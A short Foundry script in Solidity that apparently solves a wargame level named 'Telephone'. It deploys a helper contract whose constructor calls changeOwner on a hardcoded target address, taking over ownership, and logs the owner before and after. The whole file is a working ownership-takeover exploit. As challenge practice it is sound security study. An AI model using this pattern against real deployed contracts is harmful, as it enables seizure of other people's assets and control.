// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Telephone.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Ex {
    constructor(Telephone telephone_, address _address) {
        telephone_.changeOwner(_address);
    }
}

contract TelephoneSol is Script {
    Telephone public telephone_ = Telephone(0x9381b7509dA01559650B799dbF5B8f1044DF0006);

    function run() external {
        vm.startBroadcast();

        console.log("owner: ", telephone_.owner());
        new Ex(telephone_, msg.sender);
        console.log("owner: ", telephone_.owner());

        vm.stopBroadcast();
    }
}